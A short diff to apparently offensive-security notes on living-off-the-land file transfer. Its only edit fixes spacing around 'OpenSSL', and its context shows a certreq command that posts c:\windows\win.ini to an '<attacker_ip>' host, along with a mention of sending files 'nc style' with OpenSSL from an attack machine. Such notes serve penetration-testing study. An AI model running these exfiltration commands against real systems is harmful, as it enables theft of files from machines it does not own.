@@ -32,7 +32,7 @@ certreq -Post -config http://<attacker_ip>:8000/ c:\windows\win.ini
 If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter.
 
 ### GTFOBins for linux
-`OpenSSL ` is frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
+`OpenSSL` is frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
 #### Create cert in attack machine and stand up the server
 ```bash
 # Create cert
